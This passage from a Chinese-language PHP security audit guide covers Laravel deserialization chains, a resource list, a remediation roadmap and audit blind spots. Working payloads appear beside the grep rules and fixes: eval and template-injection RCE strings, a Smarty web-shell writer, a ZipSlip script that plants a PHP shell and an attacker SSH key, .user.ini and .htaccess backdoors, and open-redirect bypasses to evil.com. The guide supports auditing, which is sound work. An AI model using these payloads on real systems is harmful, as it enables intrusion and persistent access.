// 2. 第一方包: illuminate/*, laravel/*
// 3. 常见第三方包: laravel-debugbar, laravel-telescope, doctrine-dbal

// Laravel POP Chain 搜索自动化
// 使用 PHPGGC (PHP Generic Gadget Chains) 工具
// GitHub: https://github.com/ambionics/phpggc

// 安装 PHPGGC
// git clone https://github.com/ambionics/phpggc.git

// 列出所有可用 gadget chains
// php phpggc/laravel/gchains

// 生成 Laravel payload
// php phpggc Laravel/RCE1 system id
// php phpggc Laravel/RCE2 system whoami

// Laravel 反序列化入口搜索
// 1. 直接: unserialize($input)
// 2. 间接: Cookie 加密 → 如果 APP_KEY 泄露可伪造 Cookie
// 3. 间接: Session 文件存储 + session.serialize_handler 不匹配
// 4. 间接: Cache 序列化 (file/database cache driver)
// 5. 间接: Queue 任务序列化
// 6. 新: Livewire 组件 hydration (CVE-2025-54068)

// Laravel APP_KEY 泄露 → Cookie 伪造 → RCE 链
// 1. 获取 APP_KEY (通过 .env 泄露、调试信息、源码泄露)
// 2. 使用 APP_KEY 加密恶意序列化数据
// 3. 替换 Cookie → Laravel 自动解密 → unserialize() → POP Chain → RCE
// 审计:
grep -rn 'APP_KEY' .env .env.example 2>/dev/null
grep -rn 'APP_DEBUG.*true' .env 2>/dev/null
```

### C.17 中文社区精华参考

```
PHP 代码审计 — 中文安全社区精华资源（2025 更新）
================================================

先知社区 (xz.aliyun.com):
------------------------
- PHP 反序列化入门及多条 POP 链分析: https://xz.aliyun.com/t/2715
- PHP 反序列化漏洞学习: https://xz.aliyun.com/t/2613
- ThinkPHP 6.0 反序列化利用链: https://xz.aliyun.com/t/7082
- ThinkPHP 5.0 反序列化 Windows 写文件方法: https://xz.aliyun.com/t/7457
- WeCenter v3.3.4 多个前台反序列化漏洞挖掘: https://xz.aliyun.com/t/7077
- 通义灵码辅助代码审计实践: https://xz.aliyun.com/t/16630

长亭百川云:
----------
- PHP 反序列化代码审计由浅入深: https://rivers.chaitin.cn/blog/cqkbod90lnec5jjug4d0

阿里云漏洞库 (avd.aliyun.com):
------------------------------
- Yii2 反序列化漏洞 (CVE-2025-2690)
- WordPress 插件反序列化漏洞 (CVE-2025-8289)
- PHP 多个漏洞综合公告: https://www.hkcert.org/tc/security-bulletin/php-multiple-vulnerabilities_20250319

HKCERT:
-------
- PHP 多个漏洞安全公告 (2025-03): https://www.hkcert.org/security-bulletin/php-multiple-vulnerabilities_20250319
- 远程攻击者可触发 RCE、绕过安全限制及数据篡改

TWCERT (台湾):
--------------
- ADOdb SQL 注入 (CVE-2025-46337) 公告: https://www.twcert.org.tw/tw/cp-169-10102-2d593-1.html

FreeBuf:
--------
- CMS 漏洞标签 (含 PHP 审计实战): https://m.freebuf.com/tag/CMS%E6%BC%8F%E6%B4%9E
- 织梦 CMS 免杀 Webshell 到 RCE (2025-08)

GitHub:
-------
- 深入理解 PHP 代码审计 (HackPHP): https://github.com/hirak0/HackPHP
- PHPGGC (PHP Generic Gadget Chains): https://github.com/ambionics/phpggc
- PHP Filter Chain Generator: https://github.com/synacktiv/php_filter_chain_generator
- PayloadsAllTheThings (PHP Deserialization): https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md

TuxCare:
--------
- 5 PHP Vulnerabilities in 2025 & How to Secure Them: https://tuxcare.com/blog/php-vulnerability/
```

### C.18 PHP 安全审计防御升级路线图

```
PHP 应用安全防御升级路线图（2025-2026）
========================================

P0 — 立即修复（24 小时内）
──────────────────────────
□ 升级 PHP 版本至 8.2+（8.1 已于 2025-12-31 EOL）
□ 升级 Laravel Livewire 至 v3.6.4+（CVE-2025-54068）
□ 升级 ADOdb（如使用 PostgreSQL 驱动）（CVE-2025-46337）
□ 检查所有 WordPress 插件版本（PHP Object Injection 高发）
□ 禁用 php:// 协议输入 + 设置 allow_url_include=Off

P1 — 高优先级（1 周内）
──────────────────────────
□ 运行 composer audit 修复所有已知漏洞
□ 移除所有 unserialize() 对用户输入的使用，替换为 json_decode()
□ 检查所有 include/require 是否有白名单验证
□ 审计所有命令执行函数调用
□ 确保 APP_DEBUG=false 在生产环境

P2 — 中优先级（1 月内）
──────────────────────────
□ 引入 Semgrep + Psalm Taint Analysis 到 CI/CD
□ 对所有 Laravel Model 检查 $fillable/$guarded 配置
□ 审计所有 Route 的 middleware 覆盖
□ 使用 PHP 8.4+ Property Hooks 改善属性验证
□ 审计 Livewire 组件属性类型安全
□ 检查所有 Cookie/Session 安全配置

P3 — 长期改进
──────────────────────────
□ 迁移到 PHP 8.5 + strict_types 声明
□ 使用 SensitiveParameter 属性保护敏感参数
□ 使用 readonly class 保护配置对象
□ 建立 PHP 安全审计自动化流水线
□ 引入 RASP (Runtime Application Self-Protection)
□ 定期使用 PHPGGC 检查项目 gadget chain 风险
□ 建立依赖包安全基线（composer audit --abandoned）
```

## Part D：PHP 一线审计盲点（实战经验补充）

> 来源：codecheck/php-ReadMe.md（一线 PHP 项目代码审计经验，覆盖 3647 行实战 payload）

### 9. 变量覆盖漏洞 — `$$` 与 foreach 深坑

```
Part A 已记录 extract() / parse_str()，但实战中最容易漏掉的是 $$ 和 foreach 的可变变量。

危险模式 1：$$ 可变变量
─────────────────────────
  <?php
  $v = $_REQUEST['v'];
  eval("var_dump($$v);");    // ← 危险：$$v 等于 ${$v}
  ?>
  绕过 var_dump 拿到 RCE：
  demo.php?v=v=123)
  实际注入：eval("var_dump(123);system('id');//);");
  payload：v=v=123);system('id');//

危险模式 2：foreach + 可变变量
─────────────────────────
  <?php
  foreach ($_REQUEST as $key => $value) {
      $$key = $value;     // ← 经典业务代码：把 GET 参数都注册成全局变量
  }
  ?>
  payload：?auth_check=1&admin=1
  → $auth_check 被覆盖为 1，绕过认证检查

危险模式 3：register_globals（PHP < 5.4，老项目）
─────────────────────────
  ; php.ini
  register_globals = On
  → $_GET/$_POST/$_COOKIE 的 key 直接成为全局变量
  示例：?authorized=1 → 等同于脚本里 $authorized=1

审计 Grep：
  grep -rnE '\$\$|foreach\s*\(.*\$_(GET|POST|REQUEST|COOKIE)' --include="*.php"
  grep -rnE 'extract\s*\(|parse_str\s*\(' --include="*.php"
  grep -nE 'register_globals' php.ini

修复：
  - 禁用 $$ 可变变量，foreach 中只读取已声明变量
  - extract($input, EXTR_SKIP) 第二参数必传
  - PHP 7+ 检查 register_globals=Off
```

### 10. LDAP 注入

```
PHP 中常见于使用 ldap_bind / ldap_search 处理用户认证或目录查询的场景。
未对用户输入做 LDAP 元字符过滤即拼接到 filter。

危险元字符：* ( ) \ NUL

危险模式：
  <?php
  $filter = "(uid=" . $_POST['username'] . ")";
  $result = ldap_search($conn, "dc=example,dc=com", $filter);
  ?>

注入 payload：
  username=*
  → filter = (uid=*)，列出所有用户

  username=*)(uid=*
  → filter = (uid=*)(uid=*)，逻辑或注入

  username=admin)(|(password=*
  → 暴力枚举字段值

审计 Grep：
  grep -rnE 'ldap_search|ldap_bind|ldap_read|ldap_compare' --include="*.php"

修复：
  // 白名单严格过滤，只允许字母数字和点
  $safe = preg_replace('/[^a-zA-Z0-9._-]/', '', $username);
  // 使用 ldap_escape (PHP 5.6+)
  $safe = ldap_escape($username, "", LDAP_ESCAPE_FILTER);
```

### 11. PHP 弱类型安全问题

```
PHP 8 之前，== 比较会做隐式类型转换，导致大量绕过：

经典绕过案例：
─────────────────────────
  1. "0e12345" == "0" == 0 == false == NULL
  2. "admin" == 0     → true（字符串开头不是数字时与 0 比较为 true，PHP < 8）
  3. "1abc" == 1      → true（PHP < 8）
  4. null == false == 0
  5. md5("240610708") == md5("QNKCDZO")
     → "0e462097431906509019562988736854" == "0e830400451993494058024219903391"
     → 两个都被解析为科学计数法 0
  6. strcmp($_GET['pw'], $secret) == 0
     → 当 pw 是数组时 strcmp 返回 NULL，NULL == 0 为 true

审计 Grep：
  grep -rnE 'md5\s*\([^)]*\)\s*==|sha1\s*\([^)]*\)\s*==' --include="*.php"
  grep -rnE '\$[a-z_]+\s*==\s*[\'\"][^\'\"]*[\'\"]' --include="*.php"
  grep -rnE 'strcmp\s*\([^,]+,\s*[^)]+\)\s*==' --include="*.php"

绕过示例（hash 验证）：
  payload：username=admin&password=240610708
  → 服务端 md5("240610708") == md5(数据库中的密码)
  → 若数据库密码 md5 也是 0eXXX 开头，绕过

绕过示例（strcmp 数组绕过）：
  payload：?pw[]=1
  → strcmp("...", array(1)) 返回 NULL
  → NULL == 0 → true

修复：
  - 一律用 ===
  - hash 比较用 hash_equals($a, $b)
  - strcmp 前检查 is_string
```

### 12. PHP 字符串 offset 特性

```
PHP 7+ 中，$str[i] 语法访问字符串字符。但 $str["key"] 会被解析为 $str[intval("key")]，
在 if/循环 中可能引发非预期行为。

危险示例：
  <?php
  $password = "s3cr3t_payload";
  if (isset($password[$_POST['key']])) {
      echo "valid key!";
      // ... 认证逻辑
  }
  ?>
  payload：key=0
  → isset($password["0"]) 返回 true（字符串索引 0）
  → 绕过认证

实战盲点：
  - 把 $_GET["flag"] 当作字符串索引
  - 模板引擎里 $arr.$var 当 $var 不可控时 $arr.0 仍有效
  - 正则匹配中 preg_match('/regex/', $str) 当 $str 是数组返回 false（!=0）

审计 Grep：
  grep -rnE 'isset\s*\(\$[a-z_]+\[\$_(GET|POST|REQUEST)' --include="*.php"
  grep -rnE '\$[a-z_]+\[\$' --include="*.php"

修复：
  - 严格使用 is_string / is_array 判断类型后再访问
  - 不要把用户输入作为数组/字符串键
```

### 13. PHP 文件上传实战盲点

```
Part A 已覆盖基础扩展名/MIME/魔术字节绕过。实战补充：

1. FILES 注入遗漏
─────────────────────────
  <?php
  foreach ($_GET as $k => $v) { $$k = addslashes($v); }
  foreach ($_POST as $k => $v) { $$k = addslashes($v); }
  // ← 漏掉 $_FILES
  ?>
  → 通过 $_FILES['file']['name'] 注入 SQL

2. 双扩展名解析差异（Apache AddHandler）
─────────────────────────
  AddHandler application/x-httpd-php .php
  → 上传 shell.php.jpg
  → Apache 解析为 PHP 执行（AddHandler 从右向左匹配）

3. .user.ini 后门（PHP-FPM 场景）
─────────────────────────
  上传 .user.ini：
  auto_prepend_file=shell.jpg
  → 下次任何 PHP 脚本运行前自动 include shell.jpg

4. 多语言短标签绕过
─────────────────────────
  <? echo `id`; ?>      # short_open_tag=On
  <script language="php">system("id");</script>  # 老版本 PHP
  <?= `id` ?>            # PHP 5.4+ short echo

审计 Grep：
  grep -rnE '\$_FILES' --include="*.php"  # 检查 FILES 是否被清理
  find . -name ".user.ini" -o -name ".htaccess"
```

### 14. SSTI / PHP 模板注入

```
PHP 主流模板：Twig / Smarty / Blade / Plates

Twig 注入：
  $twig->render($_GET['tpl'], $data);    # 用户可控模板源码
  payload：{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
  payload（Twig 2.x）：{{['id']|filter('system')}}

Smarty 注入：
  $smarty->fetch($_GET['tpl']);          # 用户可控模板
  payload：{system('id')}
  payload（Smarty 3.x）：{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['c']); ?>",true)}

审计 Grep：
  grep -rnE '\$twig->render|->render\s*\(\s*\$_(GET|POST)' --include="*.php"
  grep -rnE '\$smarty->fetch|->display\s*\(\s*\$_(GET|POST)' --include="*.php"
  grep -rnE 'BladeCompiler|->compileString' --include="*.php"

修复：
  - 模板源不可控，仅参数可控
  - Twig 启用 sandbox：new \Twig\Sandbox\SecurityPolicy(...)
  - Smarty 启用 $smarty->enableSecurity()
```

### 15. 文件解压漏洞（ZipArchive extractTo）

```
漏洞条件：
  ZipArchive 扩展默认安装（Windows PHP ≥ 5.6）
  攻击者可控压缩包内容 + 服务端调用 extractTo() 解压

危险 sink：
  $zip = new \ZipArchive;
  $zip->open($user_uploaded_zip);
  $zip->extractTo('upload');   // ← 不校验内部文件名/路径
  $zip->close();

利用方式 1：路径穿越（ZipSlip）
─────────────────────────
  压缩包内构造恶意文件名：
    ../../var/www/html/shell.php
    ../../etc/cron.d/payload
    ../../root/.ssh/authorized_keys

  # 构造恶意 zip
  python3 -c "
  import zipfile
  with zipfile.ZipFile('evil.zip', 'w') as z:
      z.writestr('../../var/www/html/shell.php', '<?php system(\$_GET[0]);?>')
      z.writestr('../../root/.ssh/authorized_keys', 'ssh-rsa AAAA... attacker@kali')
  "

利用方式 2：覆盖系统关键文件
─────────────────────────
  权限足够时（root 或服务账号）可覆盖：
    /etc/rc.local                  # 自启动
    /etc/cron.d/*                  # 定时任务
    /etc/passwd / /etc/shadow      # 用户/密码
    ~/.ssh/authorized_keys         # SSH 公钥

利用方式 3：覆盖应用配置
─────────────────────────
  ../../config/database.yml        # 数据库连接
  ../../.env                       # 应用环境变量
  ../../vendor/autoload.php        # PHP 自动加载

审计 Grep：
  grep -rnE 'ZipArchive|extractTo|PclZip|->extract\(' --include="*.php"
  grep -rnE 'zip_open|zip_read' --include="*.php"

修复：
  // 严格校验每个 entry 的真实路径
  for ($i = 0; $i < $zip->numFiles; $i++) {
      $entry = $zip->getNameIndex($i);
      $real = realpath($dest . '/' . $entry);
      if ($real === false || strpos($real, realpath($dest)) !== 0) {
          throw new \Exception("zip slip detected: $entry");
      }
  }
  $zip->extractTo($dest);
```

### 16. 任意文件/目录操作（unlink / rmdir）

```
漏洞条件：文件/目录路径用户可控

危险 sink：
  unlink($path)             # 删除文件
  rmdir($path)              # 删除目录（须为空）
  rename($old, $new)        # 重命名/移动
  copy($src, $dst)          # 复制
  file_put_contents($path)  # 写入
  move_uploaded_file($tmp, $dst)  # 上传移动

常见攻击场景：
─────────────────────────
  1. 删除 lock 文件 → 绕过安装保护/重复执行限制
     unlink('/var/app/install.lock');
     → 重新触发安装向导，可重写配置/注入管理员

  2. 删除网站关键文件 → DoS
     unlink('/var/www/html/index.php');
     unlink('./config/database.yml');

  3. 任意文件覆盖
     file_put_contents('/var/www/html/.htaccess', 'AddType application/x-httpd-php .jpg');
     → 配合上传图片马 RCE

  4. 跨目录移动
     rename('/tmp/upload/shell.php', '/var/www/html/shell.php');

审计 Grep：
  grep -rnE 'unlink\s*\(|rmdir\s*\(|rename\s*\(|copy\s*\(' --include="*.php"
  grep -rnE 'file_put_contents\s*\([^,]+,\s*[^,]+\)'

修复：
  - 路径白名单（必须落在允许的目录内）
  - is_file / is_dir 校验类型
  - 业务层加 lock 文件原子检查 + 操作审计
```

### 17. URL 跳转漏洞（开放重定向）

```
漏洞条件：跳转目标 URL 用户可控且未严格校验

危险 sink：
  header("Location: " . $url);
  exit;

  // Laravel
  return redirect($url);

  // Symfony
  return new RedirectResponse($url);

经典绕过姿势：
─────────────────────────
1. 默认协议（无协议前缀）
   ?url=\\www.evil.com
   ?url=\/www.evil.com
   ?url=\\\\www.evil.com   → 浏览器解析为 http://www.evil.com

2. 前缀式（白名单只检查字符串包含）
   ?url=http://www.evil.com?www.qq.com         → 含 qq.com 但实际跳 evil
   ?url=http://www.evil.com#www.qq.com
   ?url=http://www.qq.com\\www.evil.com        → 反斜杠

3. 后缀式
   ?url=http://www.qq.com@www.evil.com         → @ 之前被当作 userinfo
   ?url=http://www.qq.com.evil.com             → 子域名
   ?url=http://www.evil.com/www.qq.com         → 路径含 qq.com

4. 协议替换
   ?url=javascript:alert(document.domain)      → IE/旧 Edge
   ?url=data:text/html,<script>alert(1)</script>
   ?url=//evil.com                             → 协议相对

5. 白名单绕过实战
   白名单逻辑：stripos($url, 'qq.com') !== false
   payload：?url=http://www.evil.com?qq.com
            ?url=http://www.evil.com#qq.com
            ?url=http://qq.com.evil.com

6. 多次跳转（A 信任 B，B 信任 C，C 跳 evil）
   A.com/redirect?url=B.com/jump?to=evil.com

审计 Grep：
  grep -rnE 'header\s*\(\s*["\']Location' --include="*.php"
  grep -rnE 'redirect\s*\(|RedirectResponse\s*\(' --include="*.php"

修复：
  // 用 parse_url 严格校验 host
  $parsed = parse_url($url);
  if (!in_array($parsed['host'] ?? '', $ALLOWED_HOSTS, true)) {
      throw new \Exception('illegal redirect');
  }
  header('Location: ' . $parsed['scheme'] . '://' . $parsed['host'] . $parsed['path']);
```
